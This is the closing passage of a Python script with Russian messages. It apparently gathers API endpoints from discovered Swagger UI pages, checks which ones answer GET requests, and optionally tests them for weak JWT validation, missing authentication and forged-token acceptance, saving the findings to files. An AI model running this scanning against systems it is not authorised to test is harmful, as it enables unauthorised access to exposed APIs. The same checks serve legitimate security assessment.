        if not ignore_trivial_body:
            print("[*] Фильтрация тривиальных health-check ответов ОТКЛЮЧЕНА (--allow-trivial-bodies)")

        jwt_config = JwtConfig(
            jwt_test=True, secret=args.jwt_secret, payload=jwt_payload,
            header_name=args.jwt_header_name, cookie_name=args.jwt_cookie_name,
            rsa_pubkey_pem=rsa_pubkey_pem, ignore_trivial_body=ignore_trivial_body,
            extra_trivial_values=extra_trivial_values,
        )

    # Читаем файл с найденными Swagger UI
    try:
        swagger_urls = load_swagger_urls(input_file, plain_mode=plain_mode)
        print(f"[INFO] Загружено {len(swagger_urls)} Swagger UI URLs")
    except FileNotFoundError:
        print(f"[ERROR] Файл {input_file} не найден!")
        return
    
    if not swagger_urls:
        print("[WARNING] Не загружено ни одного URL. Проверь формат файла "
              "(для голых ссылок используй флаг --urls).")
        return
    
    # Извлекаем все эндпоинты из всех Swagger спецификаций
    all_endpoints = []
    for url in swagger_urls:
        endpoints = extract_paths_from_swagger(url)
        all_endpoints.extend(endpoints)
    
    print(f"\n[INFO] Всего извлечено {len(all_endpoints)} эндпоинтов из {len(swagger_urls)} источников")
    
    # Проверяем эндпоинты
    if all_endpoints:
        if args.threads > 1:
            results = check_endpoints_threaded(all_endpoints, args.threads, jwt_config)
        else:
            results = check_endpoints_single(all_endpoints, jwt_config)

        valid_gets = [r.url for r in results if r.is_valid]

        # Сохраняем валидные GET эндпоинты (как раньше)
        with open("swagger_get_200.txt", "w") as f:
            for url in valid_gets:
                f.write(url + "\n")
        
        print(f"\n[DONE] Результаты сохранены в swagger_get_200.txt")
        print(f"[STATS] Обработано: {len(all_endpoints)} эндпоинтов")
        print(f"[STATS] Валидных: {len(valid_gets)} GET эндпоинтов")
        print(f"[STATS] Использовано потоков: {args.threads}")

        # Сводка и сохранение JWT-находок
        if args.jwt_test:
            print_jwt_summary(results)
            findings = write_jwt_findings(args.jwt_output, results)
            print(f"\n[JWT] Находок записано: {len(findings)} → {args.jwt_output}")
            print("[JWT] (в файл попадают только confirmed_vulnerable / signature_not_validated / "
                  "no_auth_required; защищённые эндпоинты не пишутся)")
    else:
        print("[WARNING] Не найдено ни одного эндпоинта для проверки")

if __name__ == "__main__":
    main()
